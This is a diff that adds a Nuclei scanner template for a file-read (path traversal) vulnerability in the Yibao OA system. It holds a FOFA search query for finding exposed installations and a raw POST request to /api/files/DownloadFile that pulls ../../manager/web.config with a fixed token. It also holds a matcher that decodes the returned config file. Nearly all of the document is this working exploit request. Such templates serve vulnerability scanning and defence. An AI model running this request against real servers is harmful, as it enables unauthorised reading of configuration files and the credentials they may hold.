@@ -1,0 +1,40 @@
+id: epro-DownloadFile-lfi
+
+info:
+  name: 易宝 OA downloadfile - 文件读取
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="欢迎登录易宝OA系统" || app="顶讯科技-易宝OA系统"
+  tags: epro,lfi,oa
+
+http:
+  - raw:
+      - |
+        POST /api/files/DownloadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
+        Content-Length: 93
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000 
+
+    extractors:
+      - type: json
+        name: filetext
+        part: body
+        internal: true
+        group: 1
+        json:
+          - .data
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains_all(base64_decode(filetext),'add key','add name')"
